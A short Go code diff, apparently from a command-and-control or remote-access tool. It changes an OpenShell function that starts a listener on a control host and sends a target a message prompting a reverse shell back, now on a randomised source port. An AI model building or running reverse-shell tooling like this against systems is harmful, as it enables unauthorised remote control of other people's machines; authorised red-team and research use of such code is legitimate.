@@ -110,8 +110,8 @@ func Heartbeat(udpTarget, targetIP, targetPort, srcIP, srcPort string) error {
 }
 
 // OpenShell opens a listener on the control host for a reverse shell from the target
-// OpenShell opens a listener on the control host for a reverse shell from the target
 func OpenShell(udpTarget, targetIP, targetPort string, shellType message.ShellType) error {
+	srcPort := rand.Intn(45000) + 10000
 	srcIP := network.LocalIP().String()
 
 	ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt)
@@ -132,16 +132,10 @@ func OpenShell(udpTarget, targetIP, targetPort string, shellType message.ShellTy
 		return fmt.Errorf("invalid interface: %w", err)
 	}
 
-	// Parse srcPort from targetPort for UDPConfig
-	port, err := strconv.ParseUint(targetPort, 10, 16)
-	if err != nil {
-		return fmt.Errorf("invalid target port %q: %w", targetPort, err)
-	}
-
 	udpCfg := pcapnet.UDPConfig{
 		DeviceName:     device.Name,
 		LocalIP:        localIP,
-		LocalPort:      uint16(port),
+		LocalPort:      uint16(srcPort),
 		ReserveUDPPort: true,
 	}
 
@@ -168,7 +162,8 @@ func OpenShell(udpTarget, targetIP, targetPort string, shellType message.ShellTy
 	defer listener.Close()
 	cancelSetup()
 
-	if err := sendShell(udpTarget, targetIP, targetPort, srcIP, targetPort, shellType); err != nil {
+	portStr := strconv.Itoa(srcPort)
+	if err := sendShell(udpTarget, targetIP, targetPort, srcIP, portStr, shellType); err != nil {
 		return fmt.Errorf("sending shell message: %w", err)
 	}
 
